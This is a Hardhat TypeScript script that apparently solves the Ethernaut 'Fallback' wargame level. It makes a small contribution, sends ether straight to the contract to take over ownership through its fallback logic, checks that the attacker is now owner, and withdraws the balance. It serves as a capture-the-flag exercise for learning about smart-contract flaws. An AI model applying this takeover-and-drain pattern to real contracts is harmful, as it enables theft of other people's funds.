import { ethers } from "hardhat";
import { BigNumberish } from "ethers";
import { Address } from "hardhat-deploy/types";
import { Fallback } from "../typechain-types";

const CONTRACT_ADDRESS: Address = "0x258Afb4b8C8e0004904b2d4e7A522C13783658F1";
const AMOUNT_TO_SEND: BigNumberish = ethers.utils.parseEther("0.0001");

const main = async () => {
  const [deployer] = await ethers.getSigners();
  const fallback: Fallback = await ethers.getContractAt("Fallback", CONTRACT_ADDRESS, deployer);

  const contributeTx = await fallback.contribute({ value: AMOUNT_TO_SEND });
  const contributeStatus = (await contributeTx.wait()).status === 1;
  console.log(`Contribute operation: ${contributeStatus ? '✅' : '❌'}`);

  const sendTx = await deployer.sendTransaction({
    to: CONTRACT_ADDRESS,
    value: AMOUNT_TO_SEND
  });
  const sendStatus = (await sendTx.wait()).status === 1;
  console.log(`Send transaction operation: ${sendStatus ? '✅' : '❌'}`);

  const isModifiedOwner = deployer.address === await fallback.owner();
  console.log(`Owner is attacker?? ${isModifiedOwner ? '👾' : '🛡️'}`);
  console.log(`New owner address is: ${await fallback.owner()} 🆔`);

  console.log(`Withdrawing...`);
  await fallback.withdraw();
  console.log(`Withdrawed ✅`);
};

main().catch(error => {
  console.error('🚫', error);
});
